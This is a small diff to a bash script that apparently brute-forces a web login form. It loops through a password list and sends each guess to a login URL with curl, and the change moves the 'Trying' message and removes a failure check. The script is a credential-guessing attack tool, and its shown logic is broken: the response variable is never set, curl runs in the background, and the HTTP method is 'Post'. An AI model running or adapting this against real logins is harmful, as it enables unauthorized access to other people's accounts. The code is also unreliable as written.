@@ -95,17 +95,14 @@ begin(){
 
 		[[ -z "$pass" ]] && continue
 
+		 echo "[-] Trying: $pass"
 		((attempts++))
 
 		curl -s -X Post "$url/login" -d "username=$user&password=$pass" &
 
 		pid=$!
 
-		if [[ "$response" == *fail* ]]; then
-
-			echo "[-] Trying: $pass"
-
-		elif [[ "$response" == *success* ]]; then
+		if [[ "$response" == *success* ]]; then
 
 			end=$(date +%s%N)
 
